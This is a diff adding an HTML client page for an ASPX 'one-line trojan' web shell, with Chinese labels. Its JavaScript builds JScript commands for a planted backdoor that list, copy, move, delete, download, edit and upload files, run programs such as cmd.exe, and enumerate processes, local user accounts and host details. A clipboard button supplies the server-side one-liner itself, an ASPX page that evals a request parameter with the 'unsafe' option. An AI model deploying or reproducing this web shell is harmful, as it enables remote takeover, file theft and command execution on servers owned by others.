@@ -1,0 +1,110 @@
+<html>
+<head>
+<meta http-equiv=Content-Type content="text/html; charset=gb2312">
+<title>aspx一句话木马客户端</title>
+<style type="text/css">
+ body,td{font-size: 12px;}
+table{T:expression(this.border='1',this.borderColorLight='Gray',this.borderColorDark='Gray');}
+ input,select{font-size:12px;}
+ body{margin-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;}
+ td{white-space:nowrap;}
+ a{color:black;text-decoration:none;}
+</style>
+<script language="javascript">
+ function copyFile(s,t){
+  s=s.replace(/\\/g,"\\\\");
+  t=t.replace(/\\/g,"\\\\");
+  setCmdText('var s="'+s+'",t="'+t+'";System.IO.File.Copy(s,t);');
+ }
+ function runFile(s,a){
+  s=s.replace(/\\/g,"\\\\");
+  a=a.replace(/\\/g,"\\\\");
+  setCmdText('var s="'+s+'",a="'+a+'";var p=new System.Diagnostics.Process();p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.StartInfo.FileName=s;p.StartInfo.Arguments=a;p.Start();var o=p.StandardOutput.ReadToEnd();"<pre>"+o+"<pre>"');
+ }
+ function editFile(f){
+  f=f.replace(/\\/g,"\\\\");
+  var code='var stream:System.IO.TextReader,filename,os="",thePath="'+f+'",code;stream=new System.IO.StreamReader(thePath);os=stream.ReadToEnd();os="<form method=post><input name=fname value="+thePath+"><input type=submit name=s value=保存><textarea name=t rows=30 style=width:100%;>"+Server.HtmlEncode(os)+"</textarea><input name=\\"'+address.KEY.value+'\\" type=hidden value=\'var stream:System.IO.TextWriter;stream=new  System.IO.StreamWriter(Request.Item[\\"fname\\"]);stream.Write(Request.Item[\\"t\\"]);stream.Close();stream=null;Response.Write(\\"OK\\")\'></form>";stream.Close();stream=null;os;';
+  setCmdText(code);
+ }
+ function upfile(f){
+  f=f.replace(/\\/g,"\\\\");
+  setCmdText('var files=Request.Files;if(files.Count!=0)files.Get("myfile").SaveAs("'+f+'");');
+ }
+ function downFile(f){
+  f=f.replace(/\\/g,"\\\\");
+  setCmdText('var stream,filename,bs,os,thePath="'+f+'";Response.Clear();bs=new byte[1024];stream=new System.IO.FileStream(thePath,System.IO.FileMode.Open);filename=thePath.substr(thePath.lastIndexOf("\\\\")+1);Response.AddHeader("Content-Disposition","attachment; filename="+Server.UrlEncode(filename).replace("+"," "));Response.AddHeader("Content-Length",stream.Length);Response.Charset="UTF-8";Response.ContentType="application/octet-stream";os=Response.OutputStream;var i=stream.Read(bs,0,bs.Length);while(i>0){os.Write(bs,0,i);i=stream.Read(bs,0,bs.Length);}os=null;Response.Flush();stream.Close();stream=null;Response.End();');
+ }
+ function ProcessInfo(){
+  setCmdText('var o;var proc=System.Diagnostics.Process.GetCurrentProcess();o="<h4>CurrentProcessInfor:</h4>";o+=getProcessInfo(proc);var ptc=proc.Threads;for(var p in ptc){o+="<br>"+getProcessThreadInfo(p);}o+="<h4>OtherProcessInfor:</h4>";var  ps=System.Diagnostics.Process.GetProcesses(proc.MachineName);for(var p in ps){o+="<br>"+getProcessInfo(ps[p]);}function getProcessThreadInfo(pt:System.Diagnostics.ProcessThread):String{var o="<br>Id:"+pt.Id; o+="<br>BasePriority:"+pt.BasePriority; o+="<br>CurrentPriority:"+pt.CurrentPriority;o+="<br>Site:"+pt.Site;o+="<br>StartAddress:"+pt.StartAddress;o+="<br>ThreadState:"+pt.ThreadState;return o;}function getProcessInfo(proc:System.Diagnostics.Process):String{var o="<br>ProcessName:"+proc.ProcessName;o+="<br>BasePriority:"+proc.BasePriority;o+="<br>MachineName:"+proc.MachineName;o+="<br>MainWindowTitle:"+proc.MainWindowTitle;try{o+="<br>MaxWorkingSet:"+proc.MaxWorkingSet;o+="<br>MinWorkingSet:"+proc.MinWorkingSet;}catch(e){}o+="<br>NonpagedSystemMemorySize:"+proc.NonpagedSystemMemorySize;o+="<br>PagedMemorySize:"+proc.PagedMemorySize;o+="<br>PagedSystemMemorySize:"+proc.PagedSystemMemorySize;o+="<br>PeakPagedMemorySize:"+proc.PeakPagedMemorySize;o+="<br>PeakVirtualMemorySize:"+proc.PeakVirtualMemorySize;o+="<br>PeakWorkingSet:"+proc.PeakWorkingSet;o+="<br>PrivateMemorySize:"+proc.PrivateMemorySize;o+="<br>VirtualMemorySize:"+proc.VirtualMemorySize;o+="<br>WorkingSet:"+proc.WorkingSet;return o;}');
+ }
+ function userInfo(){
+  setCmdText('function getUserInfo(strUser:String):String{var User,Flags,o="";try{ User=GetObject("WinNT://./"+strUser+",user");with(User){o+="<br>Description:"+User.Description+"<br>";o+="PasswordExpired:"+Get("PasswordExpired")+"<br>";Flags=Get("UserFlags");o+="passover:"+(Flags==65536)+"<br>";o+="CannotChangPass:"+(Flags==64)+"<br>";o+="GlobalAccount:"+(Flags==256)+"<br>";o+="PasswordMinimumLength:"+PasswordMinimumLength+"<br>";o+="PasswordRequired:"+PasswordRequired+"<br>";o+="AccountDisabled:"+AccountDisabled+"<br>";o+="IsAccountLocked:"+IsAccountLocked+"<br>";o+="Profile:"+Profile+"<br>";o+="LoginScript:"+LoginScript+"<br>";o+="HomeDirectory:"+HomeDirectory+"<br>";o+="HomeDirDrive:"+Get("HomeDirDrive")+"<br>";o+="AccountExpirationDate:"+AccountExpirationDate+"<br>";o+="BadLoginCount:"+BadLoginCount+"<br>";o+="LastLogin:"+LastLogin+"<br>";o+="LastLogoff:"+LastLogoff+"<br>";}}catch(e){}return o;}function Userinfo():String{var User,Group,Computer,o="";Computer=GetObject("WinNT://.");Computer.Filter=new Array("User");o+="User:<hr>";for(User in Computer){o+="<li>"+User.Name+"</li>";o+=getUserInfo(User.Name);o+="<hr>";}o+="UserGroup:<hr>";Computer.Filter=new Array("Group");for(Group in Computer){o+="<li>"+Group.Name+"</li>"+Group.Description+"<hr>";}return o;}用户信息();');
+ }
+ function delFile(s){
+  s=s.replace(/\\/g,"\\\\");
+  setCmdText('var s="'+s+'";System.IO.File.Delete(s);');
+ }
+ function moveFile(s,t){
+  s=s.replace(/\\/g,"\\\\");
+  t=t.replace(/\\/g,"\\\\");
+  setCmdText('var s="'+s+'",t="'+t+'";if(System.IO.File.Exists(s))System.IO.File.Move(s,t);if(System.IO.Directory.Exists(s))System.IO.Directory.Move(s,t);');
+ }
+ function Info(){
+  setCmdText('var o="";o+="<br>MachineName:"+Environment.MachineName;o+="<br>UserDomainName:"+Environment.UserDomainName;o+="<br>UserName:"+Environment.UserName;o+="<br>OS:"+Environment.OSVersion;o+="<br>ADDRESS:"+Request.ServerVariables("LOCAL_ADDR");o;');
+ }
+ function check(){
+  Top.action=Top.URL.value;
+  setCmdName(Top.KEY.value);
+  setCmdText("Server.MapPath(\".\")");
+ }
+ function listFolder(p){
+  p=p.replace(/\\/g,"\\\\");
+  setCmdText('var p="'+p+'",output="";output+="DIR:<br>";if(System.IO.Directory.Exists(p)){var ds=System.IO.Directory.GetDirectories(p);for(var i in ds)output+=ds[i]+"<br>";output+="FILE:<br>";var fs=System.IO.Directory.GetFiles(p);for(var i in fs)output+=fs[i]+"<br>";}output;');
+ }
+ function setCmdName(n){
+  getCmd().name=n;
+ }
+ function setCmdText(str){
+  getCmd().value=str;
+ }
+ function getCmd(){
+  return document.getElementById("Command");
+ }
+ function copyToClipBoard(){
+    var clipBoardContent="";
+    clipBoardContent+='<%@ Page Language="Jscript" validateRequest="false" %><%Response.Write(eval(Request.Item["w"],"unsafe"));%>';
+    window.clipboardData.setData("Text",clipBoardContent);
+ }
+</script>
+</head>
+<body>
+ <table width=100% height=100% border=0 bgcolor=menu>
+ <tr><td height=30 colspan=2>
+ <table width=100% height=25 border=0>
+ <form name=address method=post target=Display enctype="multipart/form-data" >
+ <tr><td width=60 align=center>站点:</td><td style=width:80%>
+ <input name=URL style=width:81% value="http://127.0.0.1/common.aspx"> 口令:
+ <input name=KEY style=width:10% value="w">
+ <input name=cmd type=hidden id=Command>
+ </td><td align=center><input name=Submit onClick="check();" type=submit value=连接>
+ </td></tr>
+ <tr align=center><td>路径:</td><td><input name=path style=width:100%></td><td><input name=view type=submit value=查看 onclick="listFolder(path.value);"></td></tr>
+
+ <tr align=center><td>移动复制文件:</td><td>从:<input name=sname style=width:40%>到:<input name=tname  style=width:40%></td><td> <input type=submit name=cp value=复制 onclick="copyFile(sname.value,tname.value);"><input type=submit name=mv value=移动 onclick="moveFile(sname.value,tname.value);"></td></tr>
+
+ <tr align=center><td>下载编辑文件:</td><td>文件路径:<input name=fp style=width:80%></td><td><input type=submit name=down value=下载 onclick="downFile(fp.value);"><input type=submit name=edit onclick="editFile(fp.value);" value=编辑><input type=submit name=del value=删除 onclick="delFile(fp.value);"></td></tr>
+ 
+ <tr align=center><td>运行程序:</td><td>程序路径:<input name=rfp value="c:\windows\system32\cmd.exe" style=width:40%>参数:<input name=args value="/c ipconfig /all" style=width:40%></td><td><input type=submit name=run value=运行 onclick="runFile(rfp.value,args.value);"></td></tr>
+
+ <tr align=center><td>主机信息:</td><td><input type=submit name=req value=信息 onclick="Info();"><input type=submit name=proc value=进程 onclick="ProcessInfo();"><input type=submit name=userInf value=用户信息 onclick="userInfo();">
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<input type="button" name="anniu1" onClick='copyToClipBoard()' value="复制aspx一句话服务端代码">
+</td><td></td></tr>
+ <tr align=center><td>上传文件:</td><td><input type=file name=myfile style=width:40%>保存:<input type=text name=safile style=width:40%></td><td><input type=submit name=up value=上传文件 onclick="upfile(safile.value);"></td></tr>
+ </form></table></td></tr><tr><td>
+ <iframe name=Display width=100% src=about:blank height=100% scrolling=yes></iframe>
+ </td></tr></table>
+</body></html>
+<script>
+ var Top=top.address;
+</script>
